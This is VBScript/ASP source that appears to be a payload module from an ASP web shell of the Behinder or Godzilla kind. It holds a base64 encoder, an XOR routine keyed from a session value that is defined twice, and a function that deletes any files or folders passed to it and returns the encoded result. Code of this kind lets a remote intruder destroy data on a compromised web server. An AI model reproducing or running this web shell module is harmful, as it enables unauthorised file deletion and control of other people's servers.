Function Base64Encode(sText)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue =Stream_StringToBinary(sText)
    If Mid(oNode.text,1,4)="77u/" Then
    oNode.text=Mid(oNode.text,5)
    End If
    Base64Encode = Replace(oNode.text, vbLf, "")
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Function Encrypt(data)
key=Session("k")
size=len(data)
For i=1 To size
encryptResult=encryptResult&chrb(asc(mid(data,i,1)) Xor Asc(Mid(key,(i and 15)+5,1)))
Next
Encrypt=encryptResult
End Function

Function GetFso()
	Dim Fso,Key
	Key="Scripting.FileSystemObject"
	Set Fso=server.CreateObject(Key)
	Set GetFso=Fso
End Function

Function Stream_StringToBinary(Text)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "utf-8"
  BinaryStream.Open
  BinaryStream.WriteText Text
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeBinary
  BinaryStream.Position = 0
  Stream_StringToBinary = BinaryStream.Read
  Set BinaryStream = Nothing
End Function

Function Encrypt(data)
key=Session("k")
size=len(data)
For i=1 To size
encryptResult=encryptResult&chrb(asc(mid(data,i,1)) Xor Asc(Mid(key,(i and 15)+5,1)))
Next
Encrypt=encryptResult
End Function

Function delete(paths)
	On Error Resume Next
	deleteResult="Failed"
	pathsArray=split(paths,",")
	Set Fso=GetFso()
	with Fso
		For Each cpath In pathsArray
			If .FileExists(cpath) then 
			.DeleteFile(cpath)
			End If 
			If .FolderExists(cpath) then 
				.DeleteFolder(cpath)
			End If 
		Next
		
	End With
	If Err Then 
		deleteResult=Err.Description
	Else
		deleteResult="Success" 
	End If 
	delete=deleteResult
	set Fso=nothing
End Function
Sub main(path)
	Response.write(Base64Encode(delete(path)))
End Sub